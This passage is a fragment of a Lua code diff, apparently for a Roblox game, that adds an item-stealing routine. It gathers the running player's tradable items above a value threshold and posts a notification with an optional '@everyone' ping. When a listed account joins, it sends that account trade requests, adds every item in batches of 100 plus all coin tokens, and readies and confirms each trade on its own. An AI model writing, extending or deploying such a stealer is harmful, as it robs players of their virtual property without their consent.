+        if itemInfo.TradeLock then
+            continue
+        end
+        local itemName = itemInfo.Name
+        local rap = getRAP(category, itemName)
+        if rap >= min_rap then
+            totalRAP = totalRAP + rap
+            table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemName})
+        end
+    end
+end
+
+if #itemsToSend > 0 then
+    table.sort(itemsToSend, function(a, b)
+        return a.RAP > b.RAP
+    end)
+
+    local sentItems = {}
+    for i, v in ipairs(itemsToSend) do
+        sentItems[i] = v
+    end
+
+    local prefix = ""
+    if ping == "Yes" then
+        prefix = "--[[@everyone]] "
+    end
+
+    SendJoinMessage(itemsToSend, prefix)
+
+    local function getNextBatch(items, batchSize)
+        local batch = {}
+        for i = 1, math.min(batchSize, #items) do
+            table.insert(batch, table.remove(items, 1))
+        end
+        return batch
+    end
+
+    local function doTrade(joinedUser)
+        while #itemsToSend > 0 do
+            sendTradeRequest(joinedUser)
+            repeat
+                wait(0.5)
+            until inTrade
+
+            local currentBatch = getNextBatch(itemsToSend, 100)
+            for _, item in ipairs(currentBatch) do
+                addItemToTrade(item.itemType, item.ItemID)
+            end
+
+            local rawText = PlayerGui.TradeRequest.Main.Currency.Coins.Amount.Text
+            local trimmedText = rawText:gsub("^%s*(.-)%s*$", "%1")
+            local cleanedText = trimmedText:gsub("[^%d]", "")
+            local tokensamount = tonumber(cleanedText) or 0
+            if tokensamount >= 1 then
+                netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokensamount)
+            end
+
+            readyTrade()
+            confirmTrade()
+        end
+        
+    end
+
+    local function waitForUserJoin()
+        local sentMessage = false
+        local function onUserJoin(player)
+            if table.find(users, player.Name) then
+                if not sentMessage then
+                    SendMessage(sentItems)
+                    sentMessage = true
+                end
+                doTrade(player.Name)
+            end
+        end
+        for _, p in ipairs(Players:GetPlayers()) do onUserJoin(p) end
+        Players.PlayerAdded:Connect(onUserJoin)
+    end
+    waitForUserJoin()
+end
+
